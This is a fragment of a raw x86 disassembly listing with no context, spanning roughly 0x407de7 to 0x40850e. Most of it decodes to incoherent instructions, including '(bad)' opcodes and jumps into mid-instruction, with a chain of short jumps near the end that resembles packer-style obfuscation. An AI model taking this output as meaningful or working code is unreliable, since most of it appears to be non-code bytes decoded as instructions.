  407de7:	add    bl,BYTE PTR [ecx]
  407de9:	pop    edi
  407dea:	cmp    DWORD PTR cs:[esi],edx
  407ded:	arpl   WORD PTR [eax+0xe],sp
  407df0:	or     eax,0x7d3d260f
  407df5:	daa    
  407df6:	idiv   BYTE PTR [edi+0x2586ffd]
  407dfc:	ss cmp eax,0x3374330c
  407e02:	push   edx
  407e03:	jo     0x407da2
  407e05:	pop    ecx
  407e06:	outs   dx,BYTE PTR ds:[esi]
  407e07:	push   0x5a65797d
  407e0c:	ins    DWORD PTR es:[edi],dx
  407e0d:	push   ecx
  407e0e:	enter  0xb85f,0xf1
  407e12:	inc    DWORD PTR [esi+0x44]
  407e15:	imul   esp,DWORD PTR [edi+0x4b],0x69
  407e19:	sbb    bl,BYTE PTR [eax]
  407e1b:	outs   dx,BYTE PTR ds:[esi]
  407e1c:	adc    BYTE PTR [esi+edx*1+0x45],bl
  407e20:	sbb    ch,BYTE PTR [esi+0x722d4459]
  407e26:	push   ecx
  407e27:	add    dl,bh
  407e29:	shl    BYTE PTR [ebx],cl
  407e2b:	je     0x407e3d
  407e2d:	push   esi
  407e2e:	das    
  407e2f:	and    esi,DWORD PTR [esi-0x25]
  407e32:	mov    ds:0x3fbfffc1,eax
  407e37:	and    eax,0x736c7944
  407e3c:	outs   dx,BYTE PTR ds:[esi]
  407e3d:	and    esi,DWORD PTR [ecx]
  407e3f:	aaa    
  407e40:	jge    0x407e90
  407e42:	jp     0x407eab
  407e44:	jae    0x407e97
  407e46:	or     eax,eax
  407e48:	inc    DWORD PTR ds:0x630d637e
  407e4e:	outs   dx,BYTE PTR ds:[esi]
  407e4f:	sub    BYTE PTR [ecx],ch
  407e51:	or     eax,0x27349502
  407e56:	add    DWORD PTR [edx+0x22],esp
  407e59:	cmp    DWORD PTR [ecx],ebp
  407e5b:	add    edi,DWORD PTR [edi+0x76ffab71]
  407e61:	cmp    eax,0x52f040a
  407e66:	aas    
  407e67:	sbb    ebp,DWORD PTR [edi]
  407e69:	in     eax,dx
  407e6a:	imul   ebx,DWORD PTR [ebx],0xc
  407e6d:	outs   dx,DWORD PTR ds:[esi]
  407e6e:	jae    0x407e79
  407e70:	dec    edx
  407e71:	jne    0x407e72
  407e73:	push   es
  407e74:	das    
  407e75:	cmc    
  407e76:	inc    ecx
  407e77:	push   edx
  407e78:	dec    eax
  407e79:	or     DWORD PTR [ecx+0x57],ecx
  407e7c:	add    BYTE PTR [edi+0x4],dh
  407e7f:	add    ecx,DWORD PTR [esi+0x43]
  407e82:	outs   dx,BYTE PTR ds:[esi]
  407e83:	jl     0x407e9f
  407e85:	popa   
  407e86:	in     eax,dx
  407e87:	aaa    
  407e88:	jle    0x407e6b
  407e8a:	pop    esp
  407e8b:	imul   edx,DWORD PTR [ecx],0xffffffda
  407e8e:	dec    edx
  407e8f:	adc    ch,BYTE PTR [edx+0x4a]
  407e92:	addr16 pop edi
  407e94:	js     0x407f0f
  407e96:	imul   esp,DWORD PTR [ebx],0xbf4bc060
  407e9c:	lock dec DWORD PTR [eax+eiz*2+0x4d]
  407ea1:	and    eax,0x4b792422
  407ea6:	inc    edi
  407ea7:	ins    BYTE PTR es:[edi],dx
  407ea8:	popa   
  407ea9:	outs   dx,DWORD PTR ds:[esi]
  407eaa:	cwde   
  407eab:	arpl   WORD PTR [edx+0x2d],ax
  407eae:	ja     0x407f1c
  407eb0:	mov    dl,0x52
  407eb2:	mov    edi,0x4df5bfc1
  407eb7:	pop    esp
  407eb8:	cmp    eax,0x3e08d124
  407ebd:	and    al,0x19
  407ebf:	or     al,0x34
  407ec1:	adc    eax,0x3b1a05c5
  407ec6:	cmp    al,BYTE PTR [eax]
  407ec8:	sbb    edi,DWORD PTR [ebx+eiz*8-0x1]
  407ecc:	popa   
  407ecd:	or     BYTE PTR ds:0x87f7e2a,dh
  407ed3:	fs sbb al,0x30
  407ed6:	add    BYTE PTR [esi+0x2b],bl
  407ed9:	xor    eax,0x4db0370c
  407ede:	dec    edx
  407edf:	(bad)  
  407ee0:	mov    edi,0x3d0870c1
  407ee5:	adc    DWORD PTR [ebp+0x13],ebp
  407ee8:	push   esp
  407ee9:	push   ebx
  407eea:	bound  esp,QWORD PTR [eax+0x4]
  407eed:	popa   
  407eee:	jae    0x407f43
  407ef0:	sbb    DWORD PTR [edx],ebx
  407ef2:	das    
  407ef3:	(bad)  
  407ef4:	(bad)  
  407ef5:	call   DWORD PTR [edi]
  407ef7:	sub    BYTE PTR [eax+0x50],ah
  407efa:	dec    ecx
  407efb:	jl     0x407f4b
  407efd:	inc    ecx
  407efe:	jns    0x407f53
  407f00:	ins    BYTE PTR es:[edi],dx
  407f01:	imul   esi,DWORD PTR [ebp+0x50],0x495c3776
  407f08:	pop    ebx
  407f09:	inc    eax
  407f0a:	daa    
  407f0b:	inc    ebx
  407f0c:	push   ecx
  407f0d:	pop    edx
  407f0e:	pop    esi
  407f0f:	addr16 inc ecx
  407f11:	arpl   di,di
  407f13:	rcl    dh,cl
  407f15:	call   FWORD PTR [ebp+0x79]
  407f18:	ds pusha 
  407f1a:	cmp    ax,0x644e
  407f1e:	xor    DWORD PTR [ebx+edx*8+0x6c],edi
  407f22:	mov    dh,0x3e
  407f24:	dec    edx
  407f25:	add    BYTE PTR ds:0x97112a10,cl
  407f2b:	(bad)  
  407f2c:	mov    edi,0x1f3611f0
  407f31:	pop    ss
  407f32:	cdq    
  407f33:	ins    DWORD PTR es:[edi],dx
  407f34:	xor    DWORD PTR [ebx+ebx*1],edx
  407f37:	adc    bl,BYTE PTR [ecx]
  407f39:	pop    ss
  407f3a:	and    DWORD PTR [ebx],esp
  407f3c:	and    BYTE PTR [edi+0x3e],dh
  407f3f:	cmp    eax,0xffff1323
  407f44:	(bad)  
  407f45:	jmp    DWORD PTR [esi+edi*1]
  407f48:	xor    DWORD PTR [eax],ebp
  407f4a:	jno    0x407f72
  407f4c:	push   es
  407f4d:	or     BYTE PTR [eax],bh
  407f4f:	pop    ss
  407f50:	or     DWORD PTR [ecx+0x5b],ebp
  407f53:	push   ecx
  407f54:	push   edi
  407f55:	dec    edx
  407f56:	inc    eax
  407f57:	jle    0x407fac
  407f59:	push   edi
  407f5a:	or     eax,0x48710a41
  407f5f:	jl     0x407f7e
  407f61:	bound  bx,DWORD PTR [edx+0x71]
  407f65:	sbb    cl,BYTE PTR [ebx]
  407f67:	cld    
  407f68:	xchg   edi,eax
  407f69:	(bad)  
  407f6a:	pop    esp
  407f6b:	jl     0x407fd9
  407f6d:	jne    0x407fbb
  407f6f:	pop    esp
  407f70:	bound  esp,QWORD PTR [ebx]
  407f72:	sbb    BYTE PTR [esi+0x78],cl
  407f75:	and    eax,0x4c4e5245
  407f7a:	mov    dl,0x66
  407f7c:	(bad)  
  407f7d:	idiv   BYTE PTR [edi+0x287145c1]
  407f83:	pop    eax
  407f84:	push   ecx
  407f85:	ins    BYTE PTR es:[edi],dx
  407f86:	pop    edi
  407f87:	imul   edi,DWORD PTR [ecx],0x293a733b
  407f8d:	fadd   QWORD PTR [edx]
  407f8f:	and    eax,0x662bfffe
  407f94:	sub    DWORD PTR [esi],esi
  407f96:	pop    ss
  407f97:	push   eax
  407f98:	or     BYTE PTR ds:[ecx],dl
  407f9b:	and    ebp,DWORD PTR [esp+ebp*1]
  407f9e:	or     esi,DWORD PTR [ecx]
  407fa0:	sub    eax,0xf1a11d26
  407fa5:	mov    bh,0xad
  407fa7:	int    0x1b
  407fa9:	shl    DWORD PTR [eax],0x35
  407fac:	adc    DWORD PTR [esi],eax
  407fae:	jp     0x407fe8
  407fb0:	pop    edx
  407fb1:	cdq    
  407fb2:	clc    
  407fb3:	xchg   edi,eax
  407fb4:	(bad)  
  407fb5:	jg     0x407ff0
  407fb7:	ins    BYTE PTR es:[edi],dx
  407fb8:	adc    eax,0x3b2b2115
  407fbd:	jo     0x407fc8
  407fbf:	pop    esi
  407fc0:	dec    eax
  407fc1:	push   ebp
  407fc2:	dec    esp
  407fc3:	lea    edx,[eax+0x5c]
  407fc6:	push   es
  407fc7:	je     0x408018
  407fc9:	dec    esp
  407fca:	inc    edi
  407fcb:	mov    ds:0x33174bc4,al
  407fd0:	add    eax,0x7a49df4b
  407fd5:	sbb    DWORD PTR [ebp+0x5ffe05e1],esp
  407fdb:	shr    BYTE PTR [esi+0x48],0x1a
  407fdf:	jo     0x408023
  407fe1:	imul   edi,DWORD PTR [eax+ebp*2+0x64],0x6a
  407fe6:	jle    0x407fe6
  407fe8:	outs   dx,BYTE PTR ds:[esi]
  407fe9:	daa    
  407fea:	data16 icebp 
  407fec:	(bad)  
  407fed:	(bad)  
  407fee:	(bad)  
  407fef:	jg     0x40806f
  407ff1:	and    WORD PTR [ebx+0x42],bx
  407ff5:	aaa    
  407ff6:	dec    eax
  407ff7:	pop    esp
  407ff8:	dec    edi
  407ff9:	push   0x297f6662
  407ffe:	arpl   WORD PTR [eax+eiz*2+0x63],di
  408002:	inc    ebp
  408003:	push   eax
  408004:	push   cs
  408005:	daa    
  408006:	or     al,0x35
  408008:	dec    edx
  408009:	adc    esi,DWORD PTR ds:0xf51a2a17
  40800f:	das    
  408010:	mov    esp,0x6e1c2bfc
  408015:	or     al,0x15
  408017:	arpl   WORD PTR [esi],sp
  408019:	xor    eax,0x7b253236
  40801e:	add    edi,DWORD PTR [ebx+0xb]
  408021:	jp     0x408030
  408023:	(bad)  
  408024:	jg     0x408009
  408026:	mov    edi,0x7a1d229c
  40802b:	and    esi,DWORD PTR [esi+ecx*1]
  40802e:	jl     0x40803b
  408030:	sub    BYTE PTR [eax],cl
  408032:	jge    0x408041
  408034:	dec    eax
  408035:	add    dl,BYTE PTR [ebp+0x5a]
  408038:	jge    0x40808f
  40803a:	pop    es
  40803b:	addr16 jle 0x40805b
  40803e:	jnp    0x40803f
  408040:	or     eax,0x1866fc4a
  408045:	bound  ecx,QWORD PTR [edi+0x46]
  408048:	add    ebx,eax
  40804a:	sbb    dl,BYTE PTR [ebp+0x52]
  40804d:	inc    eax
  40804e:	inc    ebx
  40804f:	imul   edi,DWORD PTR [edx+0x6e],0xb0285f58
  408056:	cmc    
  408057:	dec    ebp
  408058:	dec    edx
  408059:	push   edi
  40805a:	imul   edx,esp,0x78
  40805d:	pop    eax
  40805e:	retf   0x6d42
  408061:	dec    ecx
  408062:	inc    ecx
  408063:	lods   eax,DWORD PTR ds:[esi]
  408064:	jmp    FWORD PTR [edi-0x1]
  408067:	cmp    al,0x73
  408069:	jge    0x4080ae
  40806b:	cmp    bh,BYTE PTR [edi]
  40806d:	dec    eax
  40806e:	jae    0x4080db
  408070:	je     0x4080aa
  408072:	push   eax
  408073:	add    cl,BYTE PTR [eax]
  408075:	xor    al,0x52
  408077:	sub    al,0x35
  408079:	adc    ecx,DWORD PTR [ecx]
  40807b:	sub    al,0xab
  40807d:	mov    edi,0x37ff4bc5
  408082:	and    ebp,DWORD PTR [ebx+0x3e]
  408085:	ds push ss
  408087:	sbb    DWORD PTR [edx],esi
  408089:	mov    DWORD PTR [edi],esi
  40808b:	or     eax,0x65644521
  408090:	cmp    al,0x25
  408092:	pop    ss
  408093:	jmp    0x153bc257
  408098:	sub    BYTE PTR [ecx],ah
  40809a:	or     cl,BYTE PTR [esi]
  40809c:	loope  0x4080c7
  40809e:	or     DWORD PTR [eax+ecx*1+0x53],esi
  4080a2:	ja     0x4080ee
  4080a4:	jae    0x408116
  4080a6:	les    ecx,FWORD PTR [ebp+0x727f1b85]
  4080ac:	push   ebx
  4080ad:	or     BYTE PTR [edi+0x79],ah
  4080b0:	sbb    BYTE PTR [eax+ebx*2+0x1d],ah
  4080b4:	xor    bl,BYTE PTR [edi+0x14]
  4080b7:	xor    al,0x36
  4080b9:	fsubp  st(0),st
  4080bb:	dec    ebp
  4080bc:	fs je  0x4080c3
  4080bf:	jl     0x4080ec
  4080c1:	dec    edx
  4080c2:	xchg   DWORD PTR [ecx-0x40],edx
  4080c5:	cld    
  4080c6:	jg     0x4080ab
  4080c8:	outs   dx,DWORD PTR ds:[esi]
  4080c9:	jmp    0x408130
  4080cb:	data16 and dl,BYTE PTR [ecx+0x5d]
  4080cf:	js     0x408052
  4080d1:	cmp    BYTE PTR [esi+0x6a],al
  4080d4:	pop    ebp
  4080d5:	ds gs ds push ecx
  4080d9:	arpl   WORD PTR [edi+0x32],sp
  4080dc:	push   eax
  4080dd:	inc    DWORD PTR [edx-0x73]
  4080e0:	sbb    edi,DWORD PTR [ecx+0x8661211]
  4080e6:	ss cmp ebp,DWORD PTR ss:[ecx+eax*1]
  4080eb:	and    BYTE PTR [edx],bl
  4080ed:	fld    TBYTE PTR [edi]
  4080ef:	je     0x408072
  4080f1:	adc    DWORD PTR [edx+0x3220376c],ecx
  4080f7:	cmp    bh,BYTE PTR ss:[ecx]
  4080fa:	sub    cl,cl
  4080fc:	add    DWORD PTR [ebx],ecx
  4080fe:	pop    ebx
  4080ff:	(bad)  
  408100:	(bad)  
  408101:	jns    0x408115
  408103:	adc    DWORD PTR [ebx],esi
  408105:	cmp    al,0x7d
  408107:	adc    eax,DWORD PTR [edi]
  408109:	outs   dx,BYTE PTR ds:[esi]
  40810a:	cmovne esp,DWORD PTR [edi+0x4f]
  40810e:	dec    edx
  40810f:	push   eax
  408110:	dec    ebp
  408111:	mov    WORD PTR [edx+ebx*8+0x7f],fs
  408115:	dec    edx
  408116:	cld    
  408117:	mov    ebx,0x7f0572ff
  40811c:	or     DWORD PTR [ebp+0x78],esp
  40811f:	pop    ebx
  408120:	dec    ebp
  408121:	jae    0x4080e3
  408123:	popa   
  408124:	dec    ecx
  408125:	jno    0x408175
  408127:	adc    al,0x14
  408129:	jo     0x4081a3
  40812b:	mov    edi,0xb605fffd
  408130:	(bad)  
  408131:	push   0x4e437702
  408136:	bound  eax,QWORD PTR [ebx+0x7a]
  408139:	pusha  
  40813a:	pop    esp
  40813b:	push   0x60
  40813d:	inc    esp
  40813e:	addr16 jge 0x4081b3
  408141:	mov    DWORD PTR ds:0x6c240b4a,eax
  408147:	rcr    dh,0x42
  40814a:	(bad)  
  40814b:	fild   DWORD PTR ds:0x305f7a5e
  408151:	cmp    al,0x69
  408153:	add    dl,BYTE PTR [edx]
  408155:	xor    eax,0x9b192617
  40815a:	sub    DWORD PTR [ebx+0xb],ecx
  40815d:	jge    0x408100
  40815f:	daa    
  408160:	test   DWORD PTR ds:0x9a081d29,eax
  408166:	cmp    DWORD PTR [eax],ebp
  408168:	and    ebx,ebp
  40816a:	push   ss
  40816b:	dec    DWORD PTR [ebx-0x38]
  40816e:	jle    0x408176
  408170:	jo     0x40819a
  408172:	sub    al,0x77
  408174:	xor    BYTE PTR [ecx+0x34],bh
  408177:	push   ebp
  408178:	jno    0x40817e
  40817a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40817b:	or     edi,esp
  40817d:	(bad)  
  40817e:	jg     0x4081f3
  408180:	pop    edx
  408181:	add    ebp,DWORD PTR [ebp+ebx*2+0x4]
  408185:	dec    edx
  408186:	or     dh,BYTE PTR [edi+0x9]
  408189:	jl     0x408203
  40818b:	pop    edi
  40818c:	js     0x4081d1
  40818e:	jo     0x4081d5
  408190:	ins    DWORD PTR es:[edi],dx
  408191:	adc    DWORD PTR [ecx+0x40],esi
  408194:	outs   dx,DWORD PTR ds:[esi]
  408195:	jg     0x408192
  408197:	push   es
  408198:	dec    DWORD PTR [ecx+0x72]
  40819b:	dec    dx
  40819d:	jnp    0x408217
  40819f:	push   eax
  4081a0:	arpl   WORD PTR [eax+0x20],bp
  4081a3:	bound  eax,QWORD PTR [ecx+0x6d]
  4081a6:	js     0x4081d2
  4081a8:	ds push ebp
  4081aa:	push   0x37
  4081ac:	inc    esi
  4081ad:	(bad)  
  4081ae:	(bad)  
  4081af:	inc    DWORD PTR [edx]
  4081b1:	sub    al,0x48
  4081b3:	push   ecx
  4081b4:	xor    BYTE PTR [ebx+0x34],cl
  4081b7:	push   0x61
  4081b9:	xor    DWORD PTR [eax],esi
  4081bb:	inc    ebx
  4081bc:	sub    esi,DWORD PTR [edi]
  4081be:	push   edx
  4081bf:	sbb    DWORD PTR [edx],edi
  4081c1:	sbb    ebp,DWORD PTR ds:0x772e106c
  4081c7:	push   0x7ffe056b
  4081cc:	mov    DWORD PTR [ecx],esp
  4081ce:	or     eax,0x2061121c
  4081d3:	fs aaa 
  4081d5:	xor    ch,BYTE PTR [ebx]
  4081d7:	ja     0x408207
  4081d9:	or     eax,0xb7910903
  4081de:	(bad)  
  4081df:	(bad)  
  4081e0:	push   DWORD PTR [ebx]
  4081e2:	adc    DWORD PTR [edi+esi*1],esi
  4081e5:	add    DWORD PTR [edi],ecx
  4081e7:	sub    DWORD PTR [eax],esi
  4081e9:	jnp    0x40823d
  4081eb:	pop    esp
  4081ec:	inc    ebp
  4081ed:	punpcklbw mm1,DWORD PTR [ecx+0x4b]
  4081f1:	jp     0x408239
  4081f3:	pop    edi
  4081f4:	jne    0x40824f
  4081f6:	bound  esp,QWORD PTR [edx+eax*1+0x4]
  4081fa:	xchg   edx,eax
  4081fb:	push   0x1e
  4081fd:	mov    edi,0x53fe05c4
  408202:	jge    0x408215
  408204:	popa   
  408205:	ins    BYTE PTR es:[edi],dx
  408206:	push   eax
  408207:	bound  edx,QWORD PTR ds:0x7ef64818
  40820d:	dec    esp
  40820e:	push   0x4c
  408210:	jl     0x408211
  408212:	outs   dx,DWORD PTR ds:[esi]
  408213:	das    
  408214:	lock sub BYTE PTR [edi],ah
  408217:	dec    esp
  408218:	and    eax,0x404264fb
  40821d:	jmp    0x50a5eb87
  408222:	jnp    0x408288
  408224:	push   esi
  408225:	jo     0x408255
  408227:	dec    ebp
  408228:	inc    esp
  408229:	sti    
  40822a:	das    
  40822b:	cmc    
  40822c:	adc    ch,BYTE PTR [eax+0x52]
  40822f:	and    esi,DWORD PTR [edi]
  408231:	pusha  
  408232:	xor    BYTE PTR [ecx],dh
  408234:	sub    DWORD PTR [edi],ebp
  408236:	aas    
  408237:	sbb    ch,BYTE PTR [esi+0x75]
  40823a:	cmp    edi,0x677fe25f
  408240:	sub    al,0x66
  408242:	popa   
  408243:	add    al,BYTE PTR [esi]
  408245:	add    DWORD PTR [ecx],esi
  408247:	add    DWORD PTR [edi],esp
  408249:	xor    bh,BYTE PTR ss:[eax+0x1]
  40824d:	jl     0x40827f
  40824f:	sub    ebp,DWORD PTR [edi]
  408251:	jbe    0x408261
  408253:	push   es
  408254:	push   0xffffffff
  408256:	inc    edx
  408257:	dec    ebx
  408258:	sbb    ecx,eax
  40825a:	pop    edi
  40825b:	xchg   ecx,eax
  40825c:	push   esp
  40825d:	sub    ecx,DWORD PTR [ebp+0x18]
  408260:	inc    edx
  408261:	jo     0x408268
  408263:	or     ebx,DWORD PTR [ebx-0x2]
  408266:	jmp    FWORD PTR [ebp+0x4d6968ff]
  40826c:	jle    0x4082e5
  40826e:	inc    ebp
  40826f:	inc    ecx
  408270:	pop    ebp
  408271:	push   es
  408272:	or     dl,BYTE PTR [esi]
  408274:	sbb    eax,0x42486d56
  408279:	outs   dx,DWORD PTR ds:[esi]
  40827a:	inc    esi
  40827b:	es jle 0x4082d8
  40827e:	push   esp
  40827f:	and    ch,BYTE PTR [eax+0x33]
  408282:	inc    DWORD PTR [ebp+0x62eb52e]
  408288:	push   edx
  408289:	popa   
  40828a:	push   es
  40828b:	dec    ecx
  40828c:	ins    BYTE PTR es:[edi],dx
  40828d:	xor    al,0x49
  40828f:	bound  esp,QWORD PTR [ecx]
  408291:	pop    ecx
  408292:	dec    ecx
  408293:	or     edi,ebp
  408295:	add    bh,bh
  408297:	jle    0x4082c2
  408299:	inc    edi
  40829a:	das    
  40829b:	ss gs inc ebx
  40829e:	sub    al,0x29
  4082a0:	das    
  4082a1:	adc    BYTE PTR [ecx],dh
  4082a3:	or     ebp,DWORD PTR [ebp-0x71]
  4082a6:	sbb    ebp,DWORD PTR [eax-0x4c]
  4082a9:	(bad)  
  4082aa:	(bad)  
  4082ab:	xor    al,0xb
  4082ad:	dec    esp
  4082ae:	outs   dx,DWORD PTR ds:[esi]
  4082af:	push   ss
  4082b0:	sbb    eax,0xd2f0bf3c
  4082b5:	xchg   edi,eax
  4082b6:	daa    
  4082b7:	and    al,0x29
  4082b9:	add    al,0x7d
  4082bb:	cmp    DWORD PTR [ecx],edx
  4082bd:	aas    
  4082be:	sub    edi,DWORD PTR [ebx]
  4082c0:	push   ds
  4082c1:	comiss xmm1,DWORD PTR [edi]
  4082c4:	and    ebp,DWORD PTR [esp+esi*2-0x1d]
  4082c8:	rcr    BYTE PTR [ebp+0x7],cl
  4082cb:	js     0x4082e1
  4082cd:	dec    esp
  4082ce:	dec    ebp
  4082cf:	add    eax,DWORD PTR ds:0x2fc2528a
  4082d5:	hlt    
  4082d6:	pop    ebx
  4082d7:	daa    
  4082d8:	push   ecx
  4082d9:	pop    ebx
  4082da:	pop    esp
  4082db:	jge    0x408327
  4082dd:	mov    edx,0x71134f78
  4082e2:	dec    esp
  4082e3:	mov    edi,0xfa378dfe
  4082e8:	pop    eax
  4082e9:	dec    eax
  4082ea:	dec    edi
  4082eb:	pop    ebx
  4082ec:	out    0x7f,al
  4082ee:	pop    ecx
  4082ef:	jo     0x4082b5
  4082f1:	and    al,0x7d
  4082f3:	jg     0x408336
  4082f5:	and    DWORD PTR [bp+si],edi
  4082f8:	inc    esi
  4082fa:	outs   dx,DWORD PTR ds:[esi]
  4082fb:	sub    eax,0x4874d119
  408300:	push   0x3c7e3d6e
  408305:	sub    esp,DWORD PTR [edi+0x72]
  408308:	ss aaa 
  40830a:	ud2    
  40830c:	jge    0x408309
  40830e:	rol    BYTE PTR [ebx],cl
  408310:	xor    ah,BYTE PTR [eax]
  408312:	add    bl,BYTE PTR [eax]
  408314:	push   ss
  408315:	pop    ds
  408316:	mov    al,ds:0xd16011f
  40831b:	sub    eax,0xffff0b35
  408320:	jmp    DWORD PTR [ebp+0x63]
  408323:	push   ds
  408324:	bound  eax,QWORD PTR [edi]
  408326:	ds jp  0x408329
  408329:	sub    DWORD PTR [esi+0x7b],edi
  40832c:	add    dh,BYTE PTR ds:0x2d282020
  408332:	add    DWORD PTR [edx],edx
  408334:	xor    BYTE PTR [ebx+0x77],dh
  408337:	jg     0x408391
  408339:	jbe    0x4083b7
  40833b:	shl    dl,1
  40833d:	aaa    
  40833e:	sbb    al,BYTE PTR [edx-0x4]
  408341:	pop    dx
  408343:	jg     0x40839b
  408345:	or     dl,al
  408347:	push   0xfffffffc
  408349:	add    ch,BYTE PTR [edi+0x34]
  40834c:	sbb    BYTE PTR [eax+0x61],ch
  40834f:	lds    esp,FWORD PTR [ebx+0x4c]
  408352:	inc    ebx
  408353:	inc    esp
  408354:	or     DWORD PTR [ebx-0x2a47a1fb],ebp
  40835a:	or     eax,0x66314d62
  40835f:	jo     0x4083a5
  408361:	inc    edi
  408362:	and    eax,DWORD PTR ds:0x4ad4b8b6
  408368:	jle    0x408392
  40836a:	dec    ecx
  40836b:	ja     0x40832f
  40836d:	pop    ebp
  40836e:	inc    ebx
  40836f:	aam    0xff
  408371:	call   DWORD PTR [edx-0x2f]
  408374:	jae    0x4083d4
  408376:	imul   edx,DWORD PTR [edi+0x4c],0xd
  40837a:	pop    ebp
  40837b:	or     al,BYTE PTR [eax]
  40837d:	cmp    BYTE PTR [ebx],al
  40837f:	push   es
  408380:	ss add al,0x16
  408383:	or     DWORD PTR [ebx],ebp
  408385:	mov    edx,0x74bf02f5
  40838a:	xor    dl,BYTE PTR [ecx]
  40838c:	add    ah,BYTE PTR [ecx]
  40838e:	sbb    BYTE PTR [ebx-0x2bc79de5],al
  408394:	ss sbb edx,eax
  408397:	add    bh,bh
  408399:	mov    bh,0x8
  40839b:	sbb    al,0x2b
  40839d:	sub    eax,0x732d271d
  4083a2:	cmp    edx,DWORD PTR [edi]
  4083a4:	push   0x2e
  4083a6:	push   edi
  4083a7:	xor    al,0xad
  4083a9:	in     eax,dx
  4083aa:	(bad)  
  4083ab:	push   DWORD PTR [ebx+0x4d]
  4083ae:	pop    esi
  4083af:	push   ebx
  4083b0:	pop    eax
  4083b1:	sbb    esp,DWORD PTR [eax+0x58]
  4083b4:	std    
  4083b5:	sbb    ah,BYTE PTR [edi+0x7a]
  4083b8:	sbb    DWORD PTR [ebp+0x67],0x12
  4083bc:	(bad)  
  4083bd:	jg     0x40842a
  4083bf:	xchg   ecx,eax
  4083c0:	loope  0x408423
  4083c2:	jnp    0x4083d2
  4083c4:	inc    ebx
  4083c5:	push   esp
  4083c6:	sub    ecx,DWORD PTR [eax+0x53]
  4083c9:	jno    0x40840d
  4083cb:	sub    BYTE PTR [ecx+0x38],al
  4083ce:	das    
  4083cf:	(bad)  
  4083d0:	fnstsw ax
  4083d2:	mov    edi,0x732d57c1
  4083d7:	and    al,0x5c
  4083d9:	inc    ebx
  4083da:	dec    edi
  4083db:	xor    ch,BYTE PTR [ecx+0x6d]
  4083de:	gs jno 0x40844a
  4083e1:	pop    ebp
  4083e2:	je     0x4083bf
  4083e4:	mov    eax,0x4529e8d4
  4083e9:	sub    ah,BYTE PTR [ebx-0x4ed0a672]
  4083ef:	add    eax,0xb76fc239
  4083f4:	jg     0x408427
  4083f6:	outs   dx,DWORD PTR ds:[esi]
  4083f7:	sub    BYTE PTR [edx+eax*1],dh
  4083fa:	aaa    
  4083fb:	sbb    al,BYTE PTR [edx]
  4083fd:	pop    ds
  4083fe:	and    al,0xff
  408400:	js     0x40843b
  408402:	cmp    ah,BYTE PTR [ecx]
  408404:	daa    
  408405:	add    dl,BYTE PTR [edi]
  408407:	(bad)  
  408408:	jg     0x4083ab
  40840a:	stos   BYTE PTR es:[edi],al
  40840b:	je     0x408412
  40840d:	sub    al,0x8
  40840f:	jb     0x40846f
  408411:	dec    edi
  408412:	pop    edx
  408413:	pop    edx
  408414:	jb     0x408464
  408416:	jno    0x408494
  408418:	and    BYTE PTR [ecx+0x5e],dh
  40841b:	sbb    edi,DWORD PTR [ebp+esi*2+0x46077e89]
  408422:	jge    0x40842d
  408424:	push   0x4c596e7f
  408429:	loopne 0x40845a
  40842b:	lock mov bh,0x45
  40842e:	popa   
  40842f:	pop    ss
  408430:	adc    eax,0x4c341862
  408435:	loope  0x408487
  408437:	push   ebp
  408438:	pop    esp
  408439:	inc    edx
  40843a:	daa    
  40843b:	inc    edi
  40843c:	inc    dh
  40843e:	mov    bh,0x5f
  408440:	push   ebx
  408441:	push   edi
  408442:	pop    edx
  408443:	jle    0x40849b
  408445:	pusha  
  408446:	xor    BYTE PTR [eax+edi*2+0x68],ah
  40844a:	test   DWORD PTR [bx+di],esi
  40844d:	arpl   WORD PTR [ebp+0x47],si
  408450:	imul   ecx,DWORD PTR [ebx-0x8],0xffffffff
  408454:	call   DWORD PTR [edi+0x52115124]
  40845a:	or     al,0x7
  40845c:	cs pop ss
  40845e:	cmp    ebp,DWORD PTR [edx]
  408460:	pop    ss
  408461:	adc    dl,BYTE PTR [ebx]
  408463:	sub    esp,DWORD PTR [ebx+0x3c]
  408466:	add    BYTE PTR [edx],ah
  408468:	cmp    al,0x1e
  40846a:	sbb    BYTE PTR [ebx+0x38],bh
  40846d:	sbb    bl,BYTE PTR [ecx+0x51]
  408470:	push   DWORD PTR [edi]
  408472:	push   ebx
  408473:	jnp    0x4084f0
  408475:	push   ds
  408476:	or     al,0x17
  408478:	jle    0x408485
  40847a:	es adc al,0x5
  40847d:	xchg   ebx,eax
  40847e:	dec    BYTE PTR [edi+0x4d88f514]
  408484:	test   ecx,0x3eeb09eb
  40848a:	rcr    edi,0x1e
  40848d:	jmp    0x4084c0
  40848f:	jmp    0x408510
  408491:	jae    0x408488
  408493:	or     eax,0xa90ceba0
  408498:	mov    dl,0xbb
  40849a:	or     ebx,DWORD PTR [ebx-0x15]
  40849d:	inc    ebx
  40849e:	jmp    0x4084b7
  4084a0:	push   ecx
  4084a1:	adc    eax,0xebeeffff
  4084a6:	inc    ebp
  4084a7:	mov    ebx,DWORD PTR [edi]
  4084a9:	addps  xmm5,xmm3
  4084ac:	dec    edx
  4084ad:	dec    bl
  4084af:	jmp    0x4084be
  4084b1:	jne    0x4084e6
  4084b3:	jmp    0x4084ed
  4084b5:	xchg   ecx,edi
  4084b7:	jmp    0x408496
  4084b9:	aad    0xb
  4084bb:	inc    ecx
  4084bc:	ins    BYTE PTR es:[edi],dx
  4084bd:	push   ebp
  4084be:	jmp    0x4084b5
  4084c0:	jmp    0x4084b1
  4084c2:	cmp    edi,0xfcdfb7dd
  4084c8:	frstor [ecx]
  4084ca:	jmp    0x4084b7
  4084cc:	xor    BYTE PTR [eax],bl
  4084ce:	sbb    al,0x81
  4084d0:	ret    0x202
  4084d3:	cmp    bl,ah
  4084d5:	mov    bl,BYTE PTR [ebp-0x9]
  4084d8:	jmp    0x4084c9
  4084da:	inc    eax
  4084db:	jmp    0x4084ac
  4084dd:	cli    
  4084de:	(bad)  
  4084e0:	in     eax,0xc1
  4084e2:	(bad)  
  4084e3:	es pop ecx
  4084e5:	jmp    0x4084ab
  4084e7:	loop   0x40848b
  4084e9:	jmp    0x40849e
  4084eb:	push   ebx
  4084ec:	jmp    0x4084a6
  4084ee:	push   ss
  4084ef:	hlt    
  4084f0:	btr    ecx,esi
  4084f3:	jmp    0x40848a
  4084f5:	push   esp
  4084f6:	ins    DWORD PTR es:[edi],dx
  4084f7:	mov    ecx,0xd2e05fac
  4084fc:	test   BYTE PTR [ecx-0x62],al
  4084ff:	add    al,0xb1
  408501:	inc    esp
  408502:	call   0x572deada
  408507:	ror    BYTE PTR [ebx],0xf5
  40850a:	mov    BYTE PTR [ebp-0x11],0x43
  40850e:	inc    ebp
